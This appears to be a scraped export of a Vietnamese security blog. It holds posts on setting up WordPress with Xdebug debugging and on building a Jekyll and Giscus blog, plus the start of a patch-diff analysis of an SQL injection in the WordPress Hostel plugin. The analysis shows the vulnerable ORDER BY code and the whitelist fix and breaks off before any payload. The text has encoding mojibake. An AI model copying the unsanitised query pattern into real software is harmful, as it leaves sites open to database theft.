r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. {: .prompt-info } Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); ","permalink":"//localhost:1313/vi/posts/2025-08-21-wordpress-local-and-debugging/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction Khi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\nGithub Pages: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\nJekyll: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\nGiscus: M·ªôt h·ªá th·ªëng b√¨nh lu·∫≠n hi·ªán ƒë·∫°i d·ª±a tr√™n GitHub Discussions. Thay v√¨ ph·∫£i d√πng d·ªãch v·ª• ngo√†i nh∆∞ Disqus, b·∫°n c√≥ th·ªÉ t·∫≠n d·ª•ng GitHub ƒë·ªÉ qu·∫£n l√Ω comment, v·ª´a g·ªçn nh·∫π v·ª´a th√¢n thi·ªán v·ªõi developer.\nRequirements T√†i kho·∫£n Github Ki·∫øn th·ª©c c∆° b·∫£n v·ªÅ Markdown Creating a Site Repository ·ªû ƒë√¢y, t√¥i s·ª≠ d·ª•ng Chirpy themes, ƒë√¢y l√† theme kh√° n·ªïi ti·∫øng d√†nh cho GitHub Pages, ƒë∆∞·ª£c t·ªëi ∆∞u cho vi·ªác vi·∫øt blog c√° nh√¢n ho·∫∑c technical blog.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nƒêƒÉng nh·∫≠p v√†o Github v√† di chuy·ªÉn ƒë·∫øn starter Thay v√¨ Fork, ta click Use this template v√† ch·ªçn Create a new repository ƒë·ªÉ t·ª± ƒë·ªông t·∫°o Site Repository. ƒê·∫∑t t√™n cho Repository m·ªõi \u0026lt;username\u0026gt;.github.io, thay ƒë·ªïi \u0026lt;username\u0026gt; th√†nh Github username c·ªßa b·∫°n. Setting up the Environment C√≥ 2 l√Ω do ch√≠nh b·∫°n n√™n setup m√¥i tr∆∞·ªùng tr√™n m√°y local khi ph√°t tri·ªÉn blog:\nSau khi push code l√™n Repository, GitHub Actions s·∫Ω m·∫•t m·ªôt kho·∫£ng th·ªùi gian ƒë·ªÉ ch·∫°y r·ªìi m·ªõi build v√† render ra GitHub Pages. Khi dev tr·ª±c ti·∫øp tr√™n local, b·∫°n c√≥ th·ªÉ quan s√°t k·∫øt qu·∫£ ngay l·∫≠p t·ª©c, nhanh h∆°n v√† thu·∫≠n ti·ªán h∆°n. Using Dev Containers (Recommended for Windows) Dev Containers cung c·∫•p m·ªôt m√¥i tr∆∞·ªùng c√¥ l·∫≠p b·∫±ng Docker, gi√∫p tr√°nh xung ƒë·ªôt v·ªõi h·ªá th·ªëng v√† ƒë·∫£m b·∫£o m·ªçi dependency ƒë·ªÅu ƒë∆∞·ª£c qu·∫£n l√Ω trong container.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t Docker: Tr√™n Windows/macOS: c√†i Docker Desktop. Tr√™n Linux: c√†i Docker Engine. C√†i VS Code v√† extension Dev Containers. Clone repository: N·∫øu d√πng Docker Desktop: m·ªü VS Code v√† clone repo trong container volume. N·∫øu d√πng Docker Engine: clone repo v·ªÅ local, sau ƒë√≥ m·ªü b·∫±ng container trong VS Code. Ch·ªù qu√° tr√¨nh thi·∫øt l·∫≠p Dev Containers ho√†n t·∫•t. Setting up Natively (Recommended for Unix-like OS) V·ªõi c√°c h·ªá ƒëi·ªÅu h√†nh d·∫°ng Unix-like (Linux, macOS), b·∫°n c√≥ th·ªÉ setup m√¥i tr∆∞·ªùng tr·ª±c ti·∫øp (native) ƒë·ªÉ ƒë·∫°t hi·ªáu nƒÉng t·ªët nh·∫•t. Ngo√†i ra, v·∫´n c√≥ th·ªÉ d√πng Dev Containers nh∆∞ m·ªôt l·ª±a ch·ªçn thay th·∫ø.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nL√†m theo h∆∞·ªõng d·∫´n c√†i ƒë·∫∑t Jekyll v√† ƒë·∫£m b·∫£o ƒë√£ c√†i ƒë·∫∑t Git. Clone repository v·ªÅ m√°y local. N·∫øu b·∫°n fork theme, c√†i Node.js v√† ch·∫°y bash tools/init.sh trong th∆∞ m·ª•c g·ªëc ƒë·ªÉ kh·ªüi t·∫°o repo. Ch·∫°y l·ªánh d∆∞·ªõi ƒë√¢y ·ªü th∆∞ m·ª•c g·ªëc ƒë·ªÉ to√†n b·ªô gem s·∫Ω ƒë∆∞·ª£c c√†i v√†o ./vendor/bundle/ trong project, kh√¥ng c·∫ßn sudo v√† kh√¥ng ƒë·ª•ng g√¨ ƒë·∫øn /var/lib/gems.. bundle config set --local path \u0026#39;vendor/bundle\u0026#39; bundle install Usage Start the Jekyll Server ƒê·ªÉ ch·∫°y site tr√™n local, s·ª≠ d·ª•ng l·ªánh d∆∞·ªõi ƒë√¢y:\nbundle exec jekyll s Configuration M·ªôt s·ªë bi·∫øn c·∫ßn c·∫•u h√¨nh trong _config.yml, bao g·ªìm:\nlang: Set language cho website c·ªßa b·∫°n url: Tr·ªè ƒë·∫øn website c·ªßa b·∫°n title: Title ch√≠nh, n·∫±m d∆∞·ªõi avatar tagline: Subtitle, m√¥ t·∫£ trang web avatar: h·ªó tr·ª£ local v√† CORS resources, c√≥ th·ªÉ s·ª≠ d·ª•ng gif Comment feature via Giscus Ta s·ª≠ d·ª•ng Giscus l√†m h·ªá th·ªëng comment cho website, ngo√†i ra c√≤n c√°c option kh√°c nh∆∞: Disqus, Utterances, t·∫•t c·∫£ ƒë·ªÅu mi·ªÖn ph√≠.\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nC√†i ƒë·∫∑t giscus v√†o Github. V√†o Settings c·ªßa repository ch·ªçn General v√† b·∫≠t Discussions ƒë·ªÉ giscus l∆∞u comments v√†o Discussions. Nh·∫≠p repository \u0026lt;username\u0026gt;/\u0026lt;username\u0026gt;.github.io, th√¥ng b√°o m√†u xanh l√° xu·∫•t hi·ªán khi c√°c ti√™u ch√≠ ·ªü tr√™n ƒë∆∞·ª£c ƒë√°p ·ª©ng. Ch·ªçn th·ªÉ lo·∫°i discussion v√† ch·ªß ƒë·ªÅ cho website. C·∫•u h√¨nh giscus trong _config.yml provider: ch·ªçn giscus giscus: mapping c√°c bi·∫øn t∆∞∆°ng ·ª©ng ƒë√£ l√†m ·ªü giscus v√†o bi·∫øn giscus. Customize the Favicon T·∫°o favicon ri√™ng cho website c·ªßa b·∫°n, kh√¥ng ph·∫£i s·ª≠ d·ª•ng favicon m·∫∑c ƒë·ªãnh c·ªßa themes\nC√°c b∆∞·ªõc th·ª±c hi·ªán:\nTruy c·∫≠p Favicon Genarate Click Browse ch·ªçn favicon c·∫ßn t·∫°o, sau ƒë√≥ click Create Favicon ƒë·ªÉ t·∫°o. Click Download the generated favicon ƒë·ªÉ t·∫£i c√°c file ch·ª©a c√°c favicon v·ªÅ. Gi·∫£i n√©n file v·ª´a t·∫£i, x√≥a 2 file d∆∞·ªõi ƒë√¢y: browserconfig.xml site.webmanifest Copy to√†n b·ªô file c√≤n l·∫°i v√† paste v√†o assets/img/favicons(n·∫øu ch∆∞a c√≥ th√¨ t·∫°o). Extends Remove meta tag in Footer C√≥ th·ªÉ x√≥a d√≤ng Using the Chirpy theme for Jekyll. b·∫±ng c√°c b∆∞·ªõc sau:\nT·∫°o file theo ƒë∆∞·ªùng d·∫´n sau _data/locales/en.yml. Copy n·ªôi dung en.yml v√† d√°n v√†o file v·ª´a t·∫°o. S·ª≠a n·ªôi dung bi·∫øn meta th√†nh \u0026quot;\u0026quot; Write a post Tham kh·∫£o rule ƒë·ªÉ vi·∫øt blog c·ªßa themes v√† s·ª≠ d·ª•ng Live Preview ƒë·ªÉ quan s√°t\n","permalink":"//localhost:1313/vi/posts/2025-08-19-github-pages-with-jekyll-themes-and-giscus/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eKhi b·∫Øt ƒë·∫ßu t·∫°o blog c√° nh√¢n, c√≥ ba c√¥ng c·ª• b·∫°n c·∫ßn bi·∫øt: GitHub Pages, Jekyll v√† Giscus.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eGithub Pages\u003c/strong\u003e: D·ªãch v·ª• mi·ªÖn ph√≠ t·ª´ GitHub, cho ph√©p b·∫°n tri·ªÉn khai website tƒ©nh tr·ª±c ti·∫øp t·ª´ repository. Ch·ªâ c·∫ßn push code l√™n GitHub, blog c·ªßa b·∫°n s·∫Ω t·ª± ƒë·ªông xu·∫•t hi·ªán tr√™n Internet m√† kh√¥ng c·∫ßn server ri√™ng.\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003cstrong\u003eJekyll\u003c/strong\u003e: M·ªôt static site generator t√≠ch h·ª£p s·∫µn v·ªõi GitHub Pages. Jekyll gi√∫p b·∫°n d·ªÖ d√†ng t·∫°o blog t·ª´ c√°c file Markdown, t·ªï ch·ª©c n·ªôi dung b·∫±ng template v√† theme s·∫µn c√≥.\u003c/p\u003e","title":"Github Pages with Jekyll themes and Giscus"},{"content":"L·ªó h·ªïng trong plugin Hostel tr∆∞·ªõc phi√™n b·∫£n 1.1.5.7. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) v√† v1.1.5.7(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ GET request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü file controllers/bookings.php\nB·∫£n l·ªó h·ªïng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } B·∫£n v√°:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } üëâ B·∫£n v√° s·ª≠ d·ª•ng whitelist ƒë·ªÉ gi·ªõi h·∫°n c√°c c·ªôt c√≥ th·ªÉ ƒë∆∞·ª£c s·∫Øp x·∫øp, n·∫øu kh√¥ng h·ª£p l·ªá tr·∫£ v·ªÅ 'tB.id'.\nAnalysis: L·ªó h·ªïng xu·∫•t hi·ªán khi param ob ƒë∆∞·ª£c truy·ªÅn tr·ª±c ti·∫øp v√†o m·ªánh ƒë·ªÅ ORDER BY th√¥ng qua h√†m sanitize_text_field(), ch·ªâ escape m√† kh√¥ng filter SQLi.\nHow it work? ƒê·ªÉ inject ƒë∆∞·ª£c, ta c·∫ßn ph·∫£i x√°c ƒë·ªãnh to√†n b·ªô c√¢u query ƒë∆∞·ª£c ƒë∆∞·ª£c s·ª≠ d·ª•ng ·ªü ƒë√¢y\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM 